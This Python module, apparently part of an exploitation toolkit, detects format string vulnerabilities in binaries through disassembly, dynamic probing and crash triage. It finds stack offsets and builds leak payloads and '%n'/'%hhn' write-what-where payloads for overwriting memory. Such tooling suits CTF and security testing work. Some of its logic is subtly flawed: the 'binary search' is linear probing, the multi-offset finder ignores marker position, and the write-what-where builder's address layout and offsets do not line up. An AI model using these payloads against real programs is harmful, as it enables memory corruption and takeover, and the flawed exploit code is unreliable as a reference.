"""
Format string vulnerability detection.

Provides automated format string offset discovery including:
- Blind offset finder with binary search for remote targets
- Linear offset search for local binaries
- Support for both 32-bit and 64-bit binaries
"""

import re
import subprocess
import tempfile
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Tuple

from supwngo.core.binary import Binary
from supwngo.fuzzing.crash_triage import CrashCase
from supwngo.vulns.detector import (
    ExploitPrimitive,
    Vulnerability,
    VulnerabilityDetector,
    VulnSeverity,
    VulnType,
)
from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


@dataclass
class OffsetFinderResult:
    """Result from offset finder."""
    offset: int = 0
    found: bool = False
    marker_used: bytes = b""
    attempts: int = 0
    method: str = ""  # "binary_search" or "linear"


class BlindOffsetFinder:
    """
    Blind format string offset finder.

    Automatically discovers the format string argument offset using
    either binary search (faster for large ranges) or linear search.

    Supports both 32-bit and 64-bit binaries.

    Usage:
        finder = BlindOffsetFinder(binary)

        # For local binaries (subprocess)
        offset = finder.find_offset_linear(max_offset=50)

        # For remote/interactive targets
        offset = finder.find_offset(send_func, recv_func, use_binary_search=True)
    """

    def __init__(self, binary: Optional[Binary] = None, bits: int = 64):
        """
        Initialize blind offset finder.

        Args:
            binary: Target binary (optional for remote targets)
            bits: Architecture bits (32 or 64)
        """
        self.binary = binary
        self.bits = bits if binary is None else binary.bits
        self.word_size = self.bits // 8

        # Markers for offset detection
        if self.bits == 64:
            self.marker = b"AAAAAAAA"
            self.marker_hex = "4141414141414141"
        else:
            self.marker = b"AAAA"
            self.marker_hex = "41414141"

    def find_offset_linear(
        self,
        max_offset: int = 50,
        timeout: float = 5.0,
    ) -> Optional[int]:
        """
        Find offset using linear search (for local binaries).

        Iterates through offsets 1 to max_offset until the marker is found.

        Args:
            max_offset: Maximum offset to try
            timeout: Timeout per attempt

        Returns:
            Offset or None if not found
        """
        if self.binary is None:
            logger.error("Binary required for linear search")
            return None

        for offset in range(1, max_offset + 1):
            payload = self.marker + f"%{offset}$p".encode() + b"\n"

            try:
                result = subprocess.run(
                    [str(self.binary.path)],
                    input=payload,
                    capture_output=True,
                    timeout=timeout,
                )

                output = result.stdout.decode('latin-1', errors='ignore')
                output += result.stderr.decode('latin-1', errors='ignore')

                # Check for marker in various formats
                if self._check_marker_in_output(output):
                    logger.info(f"Found format string offset: {offset} (linear)")
                    return offset

            except subprocess.TimeoutExpired:
                continue
            except Exception as e:
                logger.debug(f"Offset {offset} failed: {e}")
                continue

        logger.warning(f"Could not find offset in range 1-{max_offset}")
        return None

    def find_offset(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        max_offset: int = 50,
        use_binary_search: bool = True,
    ) -> Optional[int]:
        """
        Find format string offset interactively.

        Args:
            send_func: Function to send payload to target
            recv_func: Function to receive response from target
            max_offset: Maximum offset to search
            use_binary_search: Use binary search (faster) or linear

        Returns:
            Offset or None if not found
        """
        if use_binary_search:
            return self._binary_search_offset(send_func, recv_func, 1, max_offset)
        else:
            return self._linear_search_offset(send_func, recv_func, max_offset)

    def _linear_search_offset(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        max_offset: int,
    ) -> Optional[int]:
        """
        Linear search for format string offset.

        Args:
            send_func: Send function
            recv_func: Receive function
            max_offset: Maximum offset

        Returns:
            Offset or None
        """
        for offset in range(1, max_offset + 1):
            payload = self.marker + f"%{offset}$p".encode()

            try:
                send_func(payload)
                response = recv_func()
                response_str = response.decode('latin-1', errors='ignore')

                if self._check_marker_in_output(response_str):
                    logger.info(f"Found format string offset: {offset} (linear)")
                    return offset

            except Exception as e:
                logger.debug(f"Offset {offset} failed: {e}")
                continue

        return None

    def _binary_search_offset(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        low: int,
        high: int,
    ) -> Optional[int]:
        """
        Binary search for format string offset.

        Uses the fact that format string offsets are sequential on the stack.
        We send a range of offsets and check if our marker appears.

        Strategy:
        1. Test if offset exists in range [low, high] by leaking mid value
        2. If we see our marker, we found it
        3. If not, narrow range based on leaked values

        For reliable binary search, we use a modified approach:
        - First probe with batch patterns to find approximate range
        - Then do linear search in that range

        Args:
            send_func: Send function
            recv_func: Receive function
            low: Lower bound
            high: Upper bound

        Returns:
            Offset or None
        """
        # First, do batch probing to find approximate region
        batch_size = 10
        found_range = None

        for batch_start in range(low, high + 1, batch_size):
            batch_end = min(batch_start + batch_size - 1, high)

            # Send batch of probes
            payload = self.marker
            for i in range(batch_start, batch_end + 1):
                payload += f"|%{i}$p".encode()

            try:
                send_func(payload)
                response = recv_func()
                response_str = response.decode('latin-1', errors='ignore')

                if self._check_marker_in_output(response_str):
                    # Marker found in this batch, narrow down
                    found_range = (batch_start, batch_end)
                    break

            except Exception as e:
                logger.debug(f"Batch {batch_start}-{batch_end} failed: {e}")
                continue

        if found_range is None:
            # Try linear search as fallback
            logger.debug("Binary search failed, falling back to linear")
            return self._linear_search_offset(send_func, recv_func, high)

        # Linear search in found range
        for offset in range(found_range[0], found_range[1] + 1):
            payload = self.marker + f"%{offset}$p".encode()

            try:
                send_func(payload)
                response = recv_func()
                response_str = response.decode('latin-1', errors='ignore')

                if self._check_marker_in_output(response_str):
                    logger.info(f"Found format string offset: {offset} (binary search)")
                    return offset

            except Exception:
                continue

        return None

    def _check_marker_in_output(self, output: str) -> bool:
        """
        Check if our marker appears in output.

        Checks for:
        - Hex marker (0x4141414141414141 or 4141414141414141)
        - Raw marker bytes reflected

        Args:
            output: Output string to check

        Returns:
            True if marker found
        """
        output_lower = output.lower()

        # Check for hex representation
        if self.marker_hex.lower() in output_lower:
            return True

        # Check with 0x prefix
        if f"0x{self.marker_hex.lower()}" in output_lower:
            return True

        return False

    def find_multiple_offsets(
        self,
        send_func: Callable[[bytes], None],
        recv_func: Callable[[], bytes],
        max_offset: int = 50,
    ) -> List[int]:
        """
        Find all offsets where we can place controlled data.

        Useful for finding multiple write targets in payloads.

        Args:
            send_func: Send function
            recv_func: Receive function
            max_offset: Maximum offset

        Returns:
            List of controllable offsets
        """
        offsets = []

        # Use different markers for each position
        markers = [
            (b"AAAAAAAA", "4141414141414141"),
            (b"BBBBBBBB", "4242424242424242"),
            (b"CCCCCCCC", "4343434343434343"),
            (b"DDDDDDDD", "4444444444444444"),
        ] if self.bits == 64 else [
            (b"AAAA", "41414141"),
            (b"BBBB", "42424242"),
            (b"CCCC", "43434343"),
            (b"DDDD", "44444444"),
        ]

        # Build payload with all markers
        payload = b"".join(m[0] for m in markers)
        marker_hex_list = [m[1] for m in markers]

        for offset in range(1, max_offset + 1):
            payload_test = payload + f"%{offset}$p".encode()

            try:
                send_func(payload_test)
                response = recv_func()
                response_str = response.decode('latin-1', errors='ignore').lower()

                # Check which marker appears
                for i, marker_hex in enumerate(marker_hex_list):
                    if marker_hex.lower() in response_str:
                        # Calculate actual offset accounting for marker position
                        actual_offset = offset
                        offsets.append(actual_offset)
                        logger.debug(f"Found controllable offset {actual_offset} (marker {i})")
                        break

            except Exception:
                continue

        return sorted(set(offsets))


class FormatStringDetector(VulnerabilityDetector):
    """
    Detect format string vulnerabilities.

    Detection methods:
    1. Static: Find printf-family calls with non-constant format (disassembly analysis)
    2. Dynamic: Test with format specifiers
    3. Crash analysis: Detect format string crashes
    """

    name = "format_string_detector"
    vuln_type = VulnType.FORMAT_STRING

    # Printf-family functions
    PRINTF_FUNCS = [
        "printf", "fprintf", "sprintf", "snprintf",
        "vprintf", "vfprintf", "vsprintf", "vsnprintf",
        "dprintf", "syslog",
    ]

    def _analyze_printf_calls(self) -> List[dict]:
        """
        Analyze printf call sites to check if format string is constant.

        Returns:
            List of potentially unsafe call sites
        """
        unsafe_calls = []

        try:
            from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_MODE_32

            # Get disassembly
            mode = CS_MODE_64 if self.binary.bits == 64 else CS_MODE_32
            md = Cs(CS_ARCH_X86, mode)
            md.detail = True

            # Find .text section
            text_section = None
            for section in self.binary._elf.iter_sections():
                if section.name == '.text':
                    text_section = section
                    break

            if not text_section:
                return []

            text_data = text_section.data()
            text_addr = text_section['sh_addr']

            # Find PLT addresses for printf functions
            printf_plt_addrs = {}
            for func in self.PRINTF_FUNCS:
                if func in self.binary.plt:
                    printf_plt_addrs[self.binary.plt[func]] = func

            if not printf_plt_addrs:
                return []

            # Disassemble and find calls to printf
            instructions = list(md.disasm(text_data, text_addr))

            for i, insn in enumerate(instructions):
                if insn.mnemonic == 'call':
                    # Check if calling printf PLT
                    try:
                        # Handle relative calls
                        if insn.operands and insn.operands[0].type == 2:  # IMM
                            target = insn.operands[0].imm
                            if target in printf_plt_addrs:
                                # Found printf call - check if format string is constant
                                # Look at previous instructions for RDI (first arg in x64)
                                is_constant = self._check_format_is_constant(
                                    instructions, i, self.binary.bits
                                )
                                if not is_constant:
                                    unsafe_calls.append({
                                        'address': insn.address,
                                        'function': printf_plt_addrs[target],
                                        'reason': 'non-constant format string',
                                    })
                    except Exception:
                        continue

        except ImportError:
            # Capstone not available, fall back to PLT-only
            pass
        except Exception as e:
            logger.debug(f"Disassembly analysis failed: {e}")

        return unsafe_calls

    def _check_format_is_constant(self, instructions: list, call_idx: int, bits: int) -> bool:
        """
        Check if the format string argument appears to be a constant.

        Traces value flow to RDI to determine if it comes from:
        - .rodata (constant string via LEA rip-relative) = SAFE
        - Stack/heap (user buffer) = UNSAFE

        Args:
            instructions: List of disassembled instructions
            call_idx: Index of the call instruction
            bits: 32 or 64 bit

        Returns:
            True if format string appears constant, False if potentially user-controlled
        """
        if bits != 64:
            # x86 is more complex, assume unsafe for now
            return False

        # Track which register holds constant value
        # Registers that contain RIP-relative addresses (constants)
        const_regs = set()

        # Look at previous 15 instructions for value flow
        start_idx = max(0, call_idx - 15)

        for i in range(start_idx, call_idx):
            insn = instructions[i]
            op_str = insn.op_str.lower()

            if insn.mnemonic == 'lea':
                # LEA with RIP-relative = loading constant address
                if 'rip' in op_str:
                    # Extract destination register
                    dest = op_str.split(',')[0].strip()
                    dest_base = dest.replace('e', 'r').replace('%', '')
                    if dest_base.startswith('r'):
                        const_regs.add(dest_base[:3])  # rax, rbx, etc.

            elif insn.mnemonic == 'mov':
                parts = op_str.split(',')
                if len(parts) == 2:
                    dest = parts[0].strip().replace('%', '')
                    src = parts[1].strip().replace('%', '')

                    dest_base = dest.replace('e', 'r')[:3] if dest.startswith(('r', 'e')) else dest
                    src_base = src.replace('e', 'r')[:3] if src.startswith(('r', 'e')) else src

                    # Propagate constant tracking
                    if src_base in const_regs:
                        const_regs.add(dest_base)
                    elif dest_base in const_regs and src_base not in const_regs:
                        # Destination overwritten with non-constant
                        const_regs.discard(dest_base)

        # The key insight: if RDI is in const_regs at the end, the format string is constant
        # This handles cases like: lea rax, [rip+X]; mov rdi, rax; mov eax, 0; call printf
        # Even though rax is overwritten, rdi still holds the constant
        if 'rdi' in const_regs:
            return True

        # Check for direct constant load to RDI in last few instructions
        for i in range(call_idx - 1, max(0, call_idx - 5) - 1, -1):
            insn = instructions[i]
            op_str = insn.op_str.lower()

            if insn.mnemonic == 'lea' and 'rip' in op_str:
                if 'rdi' in op_str or 'edi' in op_str:
                    return True  # Direct: lea rdi, [rip + offset]

            if insn.mnemonic == 'mov':
                if 'rdi' in op_str or 'edi' in op_str:
                    parts = op_str.split(',')
                    if len(parts) == 2:
                        src = parts[1].strip()
                        # Stack/heap reference = user input
                        if 'rbp' in src or 'rsp' in src or '[' in src:
                            return False
                    break  # Found RDI setter

        # Couldn't determine
        return False

    def detect(
        self,
        crash: Optional[CrashCase] = None,
    ) -> List[Vulnerability]:
        """
        Detect format string vulnerabilities.

        Args:
            crash: Optional crash case

        Returns:
            List of vulnerabilities
        """
        vulnerabilities = []

        # Static detection
        static_vulns = self._detect_static()
        vulnerabilities.extend(static_vulns)

        # Dynamic detection
        dynamic_vuln = self._detect_dynamic()
        if dynamic_vuln:
            vulnerabilities.append(dynamic_vuln)

        # Crash analysis
        if crash:
            crash_vuln = self._detect_from_crash(crash)
            if crash_vuln:
                vulnerabilities.append(crash_vuln)

        self._vulnerabilities = vulnerabilities
        return vulnerabilities

    def _detect_static(self) -> List[Vulnerability]:
        """
        Static format string detection using disassembly analysis.

        Detection approach:
        1. Disassemble binary and find printf call sites
        2. Check if format string argument is constant (safe) or variable (vulnerable)
        3. Fall back to PLT-based heuristics if disassembly fails

        Returns:
            Potential vulnerabilities
        """
        vulns = []

        has_printf = any(f in self.binary.plt for f in self.PRINTF_FUNCS)
        if not has_printf:
            return vulns

        # Try disassembly-based analysis first (more accurate)
        unsafe_calls = self._analyze_printf_calls()

        if unsafe_calls:
            # Found actual unsafe printf calls via disassembly
            for call in unsafe_calls:
                # Calculate confidence based on protections
                confidence = 0.85  # High confidence - we found actual unsafe call
                mitigations = []

                if self.binary.protections.pie:
                    confidence -= 0.05
                    mitigations.append("PIE")
                if self.binary.protections.canary:
                    confidence -= 0.05
                    mitigations.append("canary")
                if self.binary.protections.relro == "Full RELRO":
                    confidence -= 0.1
                    mitigations.append("Full RELRO")

                severity = VulnSeverity.CRITICAL if not mitigations else VulnSeverity.HIGH

                vuln = Vulnerability(
                    vuln_type=VulnType.FORMAT_STRING,
                    severity=severity,
                    address=call['address'],
                    function=call['function'],
                    detection_method="static",
                    confidence=max(0.5, confidence),
                    description=f"Format string vulnerability: {call['function']}() with {call['reason']}",
                    details={
                        "call_site": hex(call['address']),
                        "mitigations": mitigations,
                    } if mitigations else {"call_site": hex(call['address'])},
                )
                vulns.append(vuln)

            return vulns

        # Fallback: PLT-based heuristics (less accurate)
        # Only use if disassembly analysis didn't find anything
        # Check for dangerous input functions
        input_funcs = [
            "read", "fgets", "gets", "scanf", "recv", "fread",
            "__isoc99_scanf", "__isoc23_scanf",
        ]
        has_input = any(f in self.binary.plt for f in input_funcs)

        if not has_input:
            return vulns

        # Very low confidence for PLT-only detection
        base_confidence = 0.25
        mitigations = []

        if self.binary.protections.pie:
            mitigations.append("PIE")
        if self.binary.protections.canary:
            mitigations.append("canary")
        if self.binary.protections.relro == "Full RELRO":
            mitigations.append("Full RELRO")

        # Only report if no protections (likely CTF/test binary)
        # With protections, PLT-only detection has too many false positives
        if mitigations:
            return vulns  # Skip PLT-only detection for protected binaries

        for func_name in self.PRINTF_FUNCS:
            if func_name in self.binary.plt:
                vuln = Vulnerability(
                    vuln_type=VulnType.FORMAT_STRING,
                    severity=VulnSeverity.LOW,
                    address=self.binary.plt[func_name],
                    function=func_name,
                    detection_method="static",
                    confidence=base_confidence,
                    description=f"Potential format string: {func_name}() (PLT-based detection)",
                    details={"note": "Low confidence - disassembly analysis unavailable"},
                )
                vulns.append(vuln)
                break

        return vulns

    def _detect_dynamic(
        self,
        test_patterns: Optional[List[bytes]] = None,
    ) -> Optional[Vulnerability]:
        """
        Dynamic format string detection.

        Args:
            test_patterns: Custom test patterns

        Returns:
            Vulnerability if detected
        """
        if test_patterns is None:
            test_patterns = [
                b"%x" * 20 + b"\n",
                b"%p" * 20 + b"\n",
                b"AAAA%08x.%08x.%08x.%08x\n",
                b"%s%s%s%s%s\n",
            ]

        for pattern in test_patterns:
            try:
                result = subprocess.run(
                    [str(self.binary.path)],
                    input=pattern,
                    capture_output=True,
                    timeout=5,
                )

                output = result.stdout + result.stderr

                # Check for leaked addresses
                if self._check_format_leak(output):
                    vuln = Vulnerability(
                        vuln_type=VulnType.FORMAT_STRING,
                        severity=VulnSeverity.HIGH,
                        detection_method="dynamic",
                        confidence=0.9,
                        controllable_input=pattern,
                        description="Format string vulnerability - can leak memory",
                    )

                    # Determine offset
                    offset = self._find_format_offset()
                    if offset:
                        vuln.offset = offset
                        vuln.details["format_offset"] = offset

                    return vuln

            except Exception as e:
                logger.debug(f"Dynamic test failed: {e}")

        return None

    def _check_format_leak(self, output: bytes) -> bool:
        """
        Check if output contains format string leaks.

        Args:
            output: Program output

        Returns:
            True if leaks detected
        """
        try:
            output_str = output.decode('latin-1')

            # Look for hex addresses
            hex_pattern = r"(0x)?[0-9a-f]{8,16}"
            matches = re.findall(hex_pattern, output_str, re.IGNORECASE)

            # Multiple hex values suggest format string leak
            if len(matches) > 5:
                return True

            # Look for repeated patterns from %p
            if "0x" in output_str.lower() and output_str.count("0x") > 3:
                return True

        except Exception:
            pass

        return False

    def _find_format_offset(
        self,
        max_offset: int = 50,
    ) -> Optional[int]:
        """
        Find format string argument offset.

        Args:
            max_offset: Maximum offset to try

        Returns:
            Offset or None
        """
        # Use BlindOffsetFinder for better offset discovery
        finder = BlindOffsetFinder(self.binary)
        return finder.find_offset_linear(max_offset=max_offset)

    def find_offset_interactive(
        self,
        send_func,
        recv_func,
        max_offset: int = 50,
        use_binary_search: bool = True,
    ) -> Optional[int]:
        """
        Find format string offset interactively with send/recv functions.

        Args:
            send_func: Function to send payload (callable taking bytes)
            recv_func: Function to receive response (callable returning bytes)
            max_offset: Maximum offset to try
            use_binary_search: Use binary search for faster discovery

        Returns:
            Offset or None
        """
        finder = BlindOffsetFinder(self.binary)
        return finder.find_offset(
            send_func, recv_func,
            max_offset=max_offset,
            use_binary_search=use_binary_search
        )

    def _detect_from_crash(
        self,
        crash: CrashCase,
    ) -> Optional[Vulnerability]:
        """
        Detect format string from crash.

        Args:
            crash: Crash case

        Returns:
            Vulnerability or None
        """
        # Check for format string indicators in crash
        if not crash.input_data:
            return None

        # Look for format specifiers in input
        input_str = crash.input_data.decode('latin-1', errors='ignore')

        format_patterns = ["%s", "%n", "%x", "%p", "%d", "%08x"]
        has_format = any(p in input_str for p in format_patterns)

        if not has_format:
            return None

        # %n crash is highly indicative
        if "%n" in input_str:
            severity = VulnSeverity.CRITICAL
            description = "Format string write detected (%n)"
        elif "%s" in input_str:
            severity = VulnSeverity.HIGH
            description = "Format string crash with %s"
        else:
            severity = VulnSeverity.MEDIUM
            description = "Possible format string vulnerability"

        vuln = Vulnerability(
            vuln_type=VulnType.FORMAT_STRING,
            severity=severity,
            address=crash.crash_address,
            detection_method="crash",
            confidence=0.85,
            controllable_input=crash.input_data,
            crash=crash,
            description=description,
        )

        # Add primitives
        if "%n" in input_str:
            vuln.primitives.append(ExploitPrimitive(
                primitive_type="write",
                target_controllable=True,
                value_controllable=True,
            ))

        vuln.primitives.append(ExploitPrimitive(
            primitive_type="leak",
            target_controllable=True,
        ))

        return vuln

    def get_exploit_primitive(
        self,
        vuln: Vulnerability,
    ) -> Optional[ExploitPrimitive]:
        """Get exploitation primitive."""
        if vuln.primitives:
            # Prefer write primitive over leak
            for p in vuln.primitives:
                if p.primitive_type == "write":
                    return p
            return vuln.primitives[0]

        return ExploitPrimitive(
            primitive_type="leak",
            target_controllable=True,
        )

    def build_leak_payload(
        self,
        offset: int,
        num_leaks: int = 10,
    ) -> bytes:
        """
        Build payload to leak addresses.

        Args:
            offset: Format string offset
            num_leaks: Number of addresses to leak

        Returns:
            Payload bytes
        """
        payload = b""
        for i in range(num_leaks):
            payload += f"%{offset + i}$p.".encode()
        return payload + b"\n"

    def build_write_payload(
        self,
        offset: int,
        target_addr: int,
        value: int,
        bits: int = 64,
    ) -> bytes:
        """
        Build payload to write value to address.

        Args:
            offset: Format string offset
            target_addr: Address to write to
            value: Value to write
            bits: 32 or 64 bit

        Returns:
            Payload bytes
        """
        # This is a simplified payload builder
        # Real implementation needs to handle:
        # - Multi-write for full value
        # - Byte ordering
        # - Current output length tracking

        if bits == 64:
            addr_bytes = target_addr.to_bytes(8, 'little')
        else:
            addr_bytes = target_addr.to_bytes(4, 'little')

        # Build payload for single byte write
        payload = addr_bytes
        write_val = value & 0xFF
        payload += f"%{write_val}c%{offset}$n".encode()

        return payload

    def build_write_what_where(
        self,
        offset: int,
        target_addr: int,
        value: int,
    ) -> bytes:
        """
        Build write-what-where payload using %n.

        Args:
            offset: Format string offset
            target_addr: Where to write
            value: What to write

        Returns:
            Payload bytes
        """
        # For a full write, we need to write byte by byte
        # This handles the "what" value byte by byte

        payload = b""
        current_len = 0

        for i in range(8 if self.binary.bits == 64 else 4):
            byte_addr = target_addr + i
            byte_val = (value >> (i * 8)) & 0xFF

            # Add address to payload
            addr_bytes = byte_addr.to_bytes(
                8 if self.binary.bits == 64 else 4,
                'little'
            )

            # Calculate padding needed
            if byte_val > current_len:
                padding = byte_val - current_len
            else:
                padding = (256 + byte_val - current_len) % 256

            payload += addr_bytes
            current_len += len(addr_bytes)

            if padding > 0:
                payload += f"%{padding}c".encode()
                current_len += padding

            payload += f"%{offset + i}$hhn".encode()

        return payload + b"\n"

    def summary(self) -> str:
        """Get detection summary."""
        printf_funcs = [f for f in self.PRINTF_FUNCS if f in self.binary.plt]

        return f"""
Format String Detection
=======================
Binary: {self.binary.path.name}

Printf functions: {printf_funcs}
Vulnerabilities: {len(self._vulnerabilities)}
"""
